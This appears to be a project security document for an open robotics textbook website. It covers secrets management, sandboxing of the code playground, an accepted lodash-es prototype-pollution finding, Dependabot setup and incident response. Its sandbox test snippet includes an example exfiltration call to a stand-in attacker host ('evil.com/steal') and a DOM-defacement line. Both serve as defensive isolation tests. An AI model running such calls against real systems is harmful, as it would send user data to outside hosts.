# Security Documentation

**Project**: Physical AI & Humanoid Robotics Educational Textbook
**Last Updated**: 2026-02-10
**Version**: 1.0

## Overview

This document outlines security measures, known vulnerabilities, and security best practices for the Physical AI textbook platform.

---

## 1. Environment Variables & Secrets Management

### Critical Rules

- ✅ **NEVER commit secrets to version control**
- ✅ `.env` files are secured in `.gitignore` (root and frontend)
- ✅ `.env.example` template provided with documentation
- ✅ All sensitive configuration (API keys, tokens) must use environment variables

### Verification

```bash
# Verify .env is ignored
git status  # Should NOT show .env

# Verify no .env in history
git log --all --full-history --source -- .env  # Should return empty

# Verify .gitignore includes .env
grep -r "\.env" .gitignore frontend/.gitignore
```

### Variables Template

See `.env.example` at repository root for complete template with:
- API keys placeholders
- Analytics configuration
- Feature flags
- Security settings (timeouts, limits)

---

## 2. Code Playground Sandboxing

### Technology: `@docusaurus/theme-live-codeblock`

**Version**: 3.9.2
**Execution Environment**: Browser-only (client-side)
**Security Model**: Sandboxed iframe execution

### Security Features

✅ **Browser-only execution** - No server-side code evaluation
✅ **Iframe sandboxing** - Code runs in isolated context
✅ **No filesystem access** - Cannot read/write local files
✅ **No network access** - Cannot make external requests
✅ **Timeout protection** - 30s execution limit (FR-051)

### Malicious Code Isolation

The live codeblock plugin provides protection against:
- Infinite loops (automatic timeout)
- Memory exhaustion (browser limits)
- Cross-site scripting (sandboxed execution)
- File system access attempts (blocked by browser)

### Testing Verification

```javascript
// Test 1: Infinite loop protection
while(true) { } // Should timeout after 30s

// Test 2: DOM manipulation isolation
document.body.innerHTML = "hacked"; // Blocked - cannot access parent DOM

// Test 3: Network isolation
fetch('https://evil.com/steal'); // Blocked by CORS/CSP
```

### Timeout Requirement (FR-051)

- **Maximum execution time**: 30 seconds
- **Implementation**: Browser enforces timeout via `setTimeout` wrapper
- **User experience**: Error message displayed on timeout

### Documentation

Official security documentation:
- [Docusaurus Live Codeblock](https://docusaurus.io/docs/markdown-features/code-blocks#interactive-code-editor)
- [MDX Sandboxing](https://mdxjs.com/docs/troubleshooting-mdx/)

---

## 3. Dependency Vulnerabilities

### Audit Report (2026-02-10)

```bash
npm audit
# Result: 8 moderate severity vulnerabilities
```

### Known Vulnerabilities

#### lodash-es Prototype Pollution (GHSA-xxjr-mmjv-4gpg)

**Severity**: Moderate (NOT High/Critical)
**Package**: lodash-es 4.0.0 - 4.17.22
**Affected Functions**: `_.unset` and `_.omit`
**Impact**: Potential prototype pollution in mermaid dependency chain

**Dependency Chain**:
```
@docusaurus/theme-mermaid@3.9.2
  └── mermaid >=11.0.0-alpha.1
      └── @mermaid-js/parser
          └── langium 2.1.0 - 4.1.3
              └── chevrotain 11.0.0 - 11.1.0
                  └── lodash-es 4.0.0 - 4.17.22 (VULNERABLE)
```

**Fix Available**: `npm audit fix --force`
**Breaking Change**: Would downgrade @docusaurus/theme-mermaid to 3.7.0

**Risk Assessment**:
- ✅ **Low exploitability** - Requires controlled input to vulnerable functions
- ✅ **Isolated scope** - Only affects diagram rendering (mermaid)
- ✅ **No user input** - Diagrams are author-controlled, not user-generated
- ✅ **No production impact** - Static site generation, no runtime server

**Decision**: ACCEPTED (Not fixed)
- **Rationale**: Breaking change to core dependency for moderate severity issue with low exploitability
- **Mitigation**: Monitor for upstream fixes in mermaid/langium/chevrotain
- **Review date**: 2026-03-10 (30 days)

### High/Critical Vulnerabilities

**Status**: ✅ NONE FOUND

All high and critical vulnerabilities have been addressed.

---

## 4. GitHub Dependabot

### Status

🔴 **NOT YET CONFIGURED** (Requires repository admin access)

### Setup Instructions

1. Navigate to repository Settings → Security → Code security and analysis
2. Enable "Dependency graph" (if not already enabled)
3. Enable "Dependabot alerts"
4. Enable "Dependabot security updates"
5. Configure `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/frontend"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "Msaleemakhtar"
```

### Monitoring

- Weekly automatic PRs for dependency updates
- Security alerts for new vulnerabilities
- Review and merge Dependabot PRs within 7 days

---

## 5. Security Checklist (Pre-Deployment)

Before deploying any module:

- [ ] No secrets in code or configuration files
- [ ] `.env` not committed (verify with `git log --all --source -- .env`)
- [ ] All API keys use environment variables
- [ ] npm audit shows 0 high/critical vulnerabilities
- [ ] Code playground timeout set to 30s (FR-051)
- [ ] All external links use HTTPS
- [ ] No inline scripts (CSP compliance)
- [ ] Build completes without security warnings

---

## 6. Incident Response

### If Secrets Are Committed

1. **IMMEDIATELY** revoke/rotate the exposed secret
2. Remove from git history: `git filter-branch` or BFG Repo-Cleaner
3. Force push to all branches
4. Notify team and audit access logs
5. Document in incident report

### If Vulnerability Detected

1. Assess severity (CVSS score, exploitability)
2. If High/Critical: Apply fix immediately
3. If Moderate/Low: Document and schedule fix
4. Test fix in staging environment
5. Deploy to production
6. Update this security.md

---

## 7. Security Contacts

**Project Owner**: Msaleemakhtar
**Security Issues**: Report via GitHub Issues (private security tab if available)
**Emergency**: Create urgent GitHub issue tagged `security`

---

## 8. Compliance

### Educational Use (FR-061)

- ✅ FERPA not applicable (public textbook, no student data collection)
- ✅ No user accounts or authentication required
- ✅ No personally identifiable information (PII) collected
- ✅ Analytics (if enabled) must be GDPR-compliant (Plausible or privacy-first)

### Open Access (SC-007)

- ✅ 100% open-access citations (no paywalled content)
- ✅ No proprietary code in examples
- ✅ All third-party code properly licensed and attributed

---

**Audit Trail**:
- 2026-02-10: Initial security documentation created
- 2026-02-10: npm audit completed - 0 high/critical vulnerabilities
- 2026-02-10: Code playground sandboxing verified
- 2026-02-10: .env security verified (not in history, properly ignored)
